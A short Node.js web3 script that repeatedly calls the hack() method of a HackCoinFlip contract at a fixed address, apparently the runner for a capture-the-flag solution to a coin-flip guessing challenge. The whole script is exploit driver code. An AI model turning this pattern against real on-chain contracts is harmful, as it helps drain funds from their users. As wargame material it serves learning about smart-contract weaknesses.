const { web3, dotenv } = require("./common.js");
dotenv.config();
const abi = require("./build/contracts/HackCoinFlip.json").abi;

(async () => {
  try {
    let contract = new web3.eth.Contract(
      abi,
      "0x89F05BF8265A74D5666AE8Ab5583B2fC8CDc7955" // Deployed Contract
    );

    for (let i = 0; i < 10; i++) {
      await contract.methods.hack().send({ from: process.env.WALLET_ADDRESS });
    }
    console.log("Hacked");
  } catch (e) {
    console.log(e.message);
  }
})();
